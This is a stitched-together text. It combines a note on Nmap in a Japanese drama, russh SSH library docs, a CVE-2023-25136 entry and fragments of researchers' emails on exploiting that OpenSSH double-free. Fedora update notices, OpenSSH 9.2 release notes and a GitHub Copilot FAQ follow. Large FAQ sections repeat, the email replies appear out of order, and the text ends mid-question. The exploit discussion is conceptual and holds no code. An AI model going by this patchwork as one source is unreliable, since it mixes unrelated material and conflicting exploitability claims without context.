In the Japanese drama series [Bloody Monday](http://wiki.d-addicts.com/Bloody_Monday), a hacker named Falcon must use his computer skills to unravel a mysterious project “Bloody Monday” and prevent a biological terrorist attack from devastating Tokyo. Nmap is used in multiple episodes, starting with Season One, Episode One. You can also find Nmap used about 20 seconds into [this clip](http://www.wat.tv/video/b4b-28co1_2jvup_.html) (Season 2, Episode 4). Other security tools [portrayed realistically](bloodymonday/bm-sadmind.jpg) include Netcat, Rainbow Crack, and an Sadmind exploit. Thanks to Shirase Akira for reporting this first.

# Crate russhCopy item path

[Source](../src/russh/lib.rs.html#1-570) Expand description

Server and client SSH asynchronous library, based on tokio/futures.

The normal way to use this library, both for clients and for
servers, is by creating *handlers*, i.e. types that implement
`client::Handler` for clients and `server::Handler` for
servers.

* [Writing SSH clients - the `russh::client` module](client/index.html "mod russh::client")
* [Writing SSH servers - the `russh::server` module](server/index.html "mod russh::server")

## [§](#using-non-socket-io--writing-tunnels)Using non-socket IO / writing tunnels

The easy way to implement SSH tunnels, like `ProxyCommand` for
OpenSSH, is to use the `russh-config` crate, and use the
`Stream::tcp_connect` or `Stream::proxy_command` methods of that
crate. That crate is a very lightweight layer above Russh, only
implementing for external commands the traits used for sockets.

## [§](#the-ssh-protocol)The SSH protocol

If we exclude the key exchange and authentication phases, handled
by Russh behind the scenes, the rest of the SSH protocol is
relatively simple: clients and servers open *channels*, which are
just integers used to handle multiple requests in parallel in a
single connection. Once a client has obtained a `ChannelId` by
calling one of the many `channel_open_…` methods of
`client::Connection`, the client may send exec requests and data
to the server.

A simple client just asking the server to run one command will
usually start by calling
`client::Connection::channel_open_session`, then
`client::Connection::exec`, then possibly
`client::Connection::data` a number of times to send data to the
command’s standard input, and finally `Connection::channel_eof`
and `Connection::channel_close`.

## [§](#design-principles)Design principles

The main goal of this library is conciseness, and reduced size and
readability of the library’s code. Moreover, this library is split
between Russh, which implements the main logic of SSH clients
and servers, and Russh-keys, which implements calls to
cryptographic primitives.

One non-goal is to implement all possible cryptographic algorithms
published since the initial release of SSH. Technical debt is
easily acquired, and we would need a very strong reason to go
against this principle. If you are designing a system from
scratch, we urge you to consider recent cryptographic primitives
such as Ed25519 for public key cryptography, and Chacha20-Poly1305
for symmetric cryptography and MAC.

## [§](#internal-details-of-the-event-loop)Internal details of the event loop

It might seem a little odd that the read/write methods for server
or client sessions often return neither `Result` nor
`Future`. This is because the data sent to the remote side is
buffered, because it needs to be encrypted first, and encryption
works on buffers, and for many algorithms, not in place.

Hence, the event loop keeps waiting for incoming packets, reacts
to them by calling the provided `Handler`, which fills some
buffers. If the buffers are non-empty, the event loop then sends
them to the socket, flushes the socket, empties the buffers and
starts again. In the special case of the server, unsollicited
messages sent through a `server::Handle` are processed when there
is no incoming packet to read.

## Re-exports[§](#reexports)

* `pub use [russh_keys](https://docs.rs/russh-keys/0.49.2/x86_64-unknown-linux-gnu/russh_keys/index.html "mod russh_keys") as keys;`

# CVE-2023-25136

| **Name** | CVE-2023-25136 |
| --- | --- |
| **Description** | OpenSSH server (sshd) 9.1 introduced a double-free vulnerability during options.kex\_algorithms handling. This is fixed in OpenSSH 9.2. The double free can be leveraged, by an unauthenticated remote attacker in the default configuration, to jump to any location in the sshd address space. One third-party report states "remote code execution is theoretically possible." |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2023-25136) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-25136); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2023-25136), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2023-25136), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2023-25136), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2023-25136), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2023-25136), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2023-25136), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2023-25136), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2023-25136)/[CVE](https://www.suse.com/security/cve/CVE-2023-25136/), GitHub [advisories](https://github.com/advisories?query=CVE-2023-25136)/[code](https://github.com/search?type=Code&q=%22CVE-2023-25136%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2023-25136%22), [web search](https://duckduckgo.com/html?q=%22CVE-2023-25136%22), [more](https://oss-security.openwall.org/wiki/vendors)) |

Is it possible to use this information leak to bypass ASLR without
crashing the process?  If so, then one could use the control of the
instruction pointer to jump to a ROP chain and get code execution.
This flaw would then be at least the third RCE in OpenBSD’s default
install, and the second in OpenSSH.

Also, is this flaw expected to be exploitable for code execution on
GNU/Linux?

Hi Georgi,

We have not been able to do anything useful on Linux (glibc) yet.

On OpenBSD, what we did works only because this double free is of the
form "free(ptr); many other malloc() and free() calls; free(ptr);".

If it were of the form "free(ptr); no other malloc() or free() call;
free(ptr);" then this double free would be caught immediately by
malloc's security checks.

Hopefully this helps! With best regards,

Fedora Update Notification
FEDORA-2023-1176c8b10c
2023-04-18 01:29:41.288570
--------------------------------------------------------------------------------

Name : openssh
Product : Fedora 37
Version : 8.8p1
Release : 10.fc37
URL : <http://www.openssh.com/portable.html>
Summary : An open source implementation of SSH protocol version 2
Description :
SSH (Secure SHell) is a program for logging into and executing
commands on a remote machine. SSH is intended to replace rlogin and
rsh, and to provide secure encrypted communications between two
untrusted hosts over an insecure network. X11 connections and
arbitrary TCP/IP ports can also be forwarded over the secure channel.

OpenSSH is OpenBSD's version of the last free version of SSH, bringing
it up to date in terms of security and features.

This package includes the core files necessary for both the OpenSSH
client and server. To make this package useful, you should also
install openssh-clients, openssh-server, or both.

Fedora Update Notification
FEDORA-2023-123647648e
2023-04-19 01:38:17.099661
--------------------------------------------------------------------------------

Name : openssh
Product : Fedora 38
Version : 9.0p1
Release : 15.fc38
URL : <http://www.openssh.com/portable.html>
Summary : An open source implementation of SSH protocol version 2
Description :
SSH (Secure SHell) is a program for logging into and executing
commands on a remote machine. SSH is intended to replace rlogin and
rsh, and to provide secure encrypted communications between two
untrusted hosts over an insecure network. X11 connections and
arbitrary TCP/IP ports can also be forwarded over the secure channel.

OpenSSH is OpenBSD's version of the last free version of SSH, bringing
it up to date in terms of security and features.

This package includes the core files necessary for both the OpenSSH
client and server. To make this package useful, you should also
install openssh-clients, openssh-server, or both.

OpenSSH 9.2 was released on 2023-02-02. It is available from the
mirrors listed at https://www.openssh.com/.
OpenSSH is a 100% complete SSH protocol 2.0 implementation and
includes sftp client and server support.
Once again, we would like to thank the OpenSSH community for their
continued support of the project, especially those who contributed
code or patches, reported bugs, tested snapshots or donated to the
project. More information on donations may be found at:
https://www.openssh.com/donations.html
Changes since OpenSSH 9.1
=========================
This release fixes a number of security bugs.
Security
========
This release contains fixes for two security problems and a memory
safety problem. The memory safety problem is not believed to be
exploitable, but we report most network-reachable memory faults as
security bugs.
\* sshd(8): fix a pre-authentication double-free memory fault
introduced in OpenSSH 9.1. This is not believed to be exploitable,
and it occurs in the unprivileged pre-auth process that is
subject to chroot(2) and is further sandboxed on most major
platforms.
\* ssh(8): in OpenSSH releases after 8.7, the PermitRemoteOpen option
would ignore its first argument unless it was one of the special
keywords "any" or "none", causing the permission list to fail open
if only one permission was specified. bz3515
\* ssh(1): if the CanonicalizeHostname and CanonicalizePermittedCNAMEs
options were enabled, and the system/libc resolver did not check
that names in DNS responses were valid, then use of these options
could allow an attacker with control of DNS to include invalid
characters (possibly including wildcards) in names added to
known\_hosts files when they were updated. These names would still
have to match the CanonicalizePermittedCNAMEs allow-list, so
practical exploitation appears unlikely.
Potentially-incompatible changes
--------------------------------
\* ssh(1): add a new EnableEscapeCommandline ssh\_config(5) option that
controls whether the client-side ~C escape sequence that provides a
command-line is available. Among other things, the ~C command-line
could be used to add additional port-forwards at runtime.
This option defaults to "no", disabling the ~C command-line that
was previously enabled by default. Turning off the command-line
allows platforms that support sandboxing of the ssh(1) client
(currently only OpenBSD) to use a stricter default sandbox policy.
New features
------------
\* sshd(8): add support for channel inactivity timeouts via a new
sshd\_config(5) ChannelTimeout directive. This allows channels that
have not seen traffic in a configurable interval to be
automatically closed. Different timeouts may be applied to session,
X11, agent and TCP forwarding channels.
\* sshd(8): add a sshd\_config UnusedConnectionTimeout option to
terminate client connections that have no open channels for a
length of time. This complements the ChannelTimeout option above.
\* sshd(8): add a -V (version) option to sshd like the ssh client has.
\* ssh(1): add a "Host" line to the output of ssh -G showing the
original hostname argument. bz3343
\* scp(1), sftp(1): add a -X option to both scp(1) and sftp(1) to
allow control over some SFTP protocol parameters: the copy buffer
length and the number of in-flight requests, both of which are used
during upload/download. Previously these could be controlled in
sftp(1) only. This makes them available in both SFTP protocol
clients using the same option character sequence.
\* ssh-keyscan(1): allow scanning of complete CIDR address ranges,
e.g. "ssh-keyscan 192.168.0.0/24". If a CIDR range is passed, then
it will be expanded to all possible addresses in the range
including the all-0s and all-1s addresses. bz#976
\* ssh(1): support dynamic remote port forwarding in escape
command-line's -R processing. bz#3499
Bugfixes
--------
\* ssh(1): when restoring non-blocking mode to stdio fds, restore
exactly the flags that ssh started with and don't just clobber them
with zero, as this could also remove the append flag from the set.
bz3523
\* ssh(1): avoid printf("%s", NULL) if using UserKnownHostsFile=none
and a hostkey in one of the system known hosts file changes.
\* scp(1): switch scp from using pipes to a socket-pair for
communication with its ssh sub-processes, matching how sftp(1)
operates.
\* sshd(8): clear signal mask early in main(); sshd may have been
started with one or more signals masked (sigprocmask(2) is not
cleared on fork/exec) and this could interfere with various things,
e.g. the login grace timer. Execution environments that fail to
clear the signal mask before running sshd are clearly broken, but
apparently they do exist.
\* ssh(1): warn if no host keys for hostbased auth can be loaded.
\* sshd(8): Add server debugging for hostbased auth that is queued and
sent to the client after successful authentication, but also logged
to assist in diagnosis of HostbasedAuthentication problems. bz3507
\* ssh(1): document use of the IdentityFile option as being usable to
list public keys as well as private keys. GHPR352
\* sshd(8): check for and disallow MaxStartups values less than or
equal to zero during config parsing, rather than failing later at
runtime. bz3489
\* ssh-keygen(1): fix parsing of hex cert expiry times specified on
the command-line when acting as a CA.
\* scp(1): when scp(1) is using the SFTP protocol for transport (the
default), better match scp/rcp's handling of globs that don't match
the globbed characters but do match literally (e.g. trying to
transfer a file named "foo.[1]"). Previously scp(1) in SFTP mode
would not match these pathnames but legacy scp/rcp mode would.
bz3488
\* ssh-agent(1): document the "-O no-restrict-websafe" command-line
option.
\* ssh(1): honour user's umask(2) if it is more restrictive then the
ssh default (022).
Portability
-----------
\* sshd(8): allow writev(2) in the Linux seccomp sandbox. This seems
to be used by recent glibcs at least in some configurations during
error conditions. bz3512.
\* sshd(8): simply handling of SSH\_CONNECTION PAM env var, removing
global variable and checking the return value from pam\_putenv.
bz3508
\* sshd(8): disable SANDBOX\_SECCOMP\_FILTER\_DEBUG that was mistakenly
enabled during the OpenSSH 9.1 release cycle.
\* misc: update autotools and regenerate the config files using the
latest autotools
\* all: use -fzero-call-used-regs=used on clang 15 instead of
-fzero-call-used-reg=all, as some versions of clang 15 have
miscompile code when it was enabled. bz3475
\* sshd(8): defer PRNG seeding until after the initial closefrom(2)
call. PRNG seeding will initialize OpenSSL, and some engine
providers (e.g. Intel's QAT) will open descriptors for their own
use that closefrom(2) could clobber. bz3483
\* misc: in the poll(2)/ppoll(2) compatibility code, avoid assuming
the layout of fd\_set.
\* sftp-server(8), ssh-agent(1): fix ptrace(2) disabling on older
FreeBSD kernels. Some versions do not support using id 0 to refer
to the current PID for procctl, so try again with getpid()
explicitly before failing.
\* configure.ac: fix -Wstrict-prototypes in configure test code.
Clang 16 now warns on this and legacy prototypes will be removed
in C23. GHPR355
\* configure.ac: fix setres\*id checks to work with clang-16. glibc
has the prototypes for setresuid behind \_GNU\_SOURCE, and clang 16
will error out on implicit function definitions. bz3497

Unfortunately, no: sshd calls _exit() immediately after this information
leak, and fork()s + re-execv()s itself (and therefore re-randomizes its
address space) the next time we connect to it; i.e., a memory address
leaked in one connection is useless in another connection.

We are focusing on OpenBSD for now, because its malloc seems more
compatible with this particular double-free bug than glibc's malloc; we
will look into glibc/Linux at some point, and will keep you posted.

Thank you very much! With best regards,

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

